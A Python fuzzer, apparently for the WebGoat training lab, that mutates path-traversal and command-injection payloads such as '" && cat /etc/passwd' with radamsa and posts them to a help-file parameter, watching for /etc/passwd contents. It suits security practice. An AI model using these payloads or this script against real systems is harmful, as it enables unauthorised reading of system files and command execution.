import requests
import subprocess

payloads = [
    "/etc/passwd",
    "%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../../../../../../etc%2fpasswd",
    '"%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../../../../../../etc%2fpas??? #"',
    '" && cat /etc/passwd',
    '" && cat /etc/pas???'
]

def validate( p, r):
    if r.text.find("You are currently viewing") == -1:
        raise Exception("Session might be dead")
    if r.text.find("root") > -1:
        print(p)
        raise Exception("Possible bypass!")

def main():
    print("Starting fuzzer...")
    while True:
        for i in range(0,100):
            for p in payloads:
                try:
                    result = subprocess.run(['radamsa', '-n', '1'], stdout=subprocess.PIPE, input=p.encode())
                    fuzzed = result.stdout
                    data = {
                        #'Screen': '1922448916',
                        #'menu' : '1100',
                        'SUBMIT': 'View',
                        'HelpFile': fuzzed
                    }
                    r = requests.post('/WebGoat/attack?Screen=1922448916&menu=1100', data=data, cookies={'JSESSIONID':''})
                    validate( p, r )
                except:
                    pass
    print("Done.")


if __name__== "__main__":
    main()
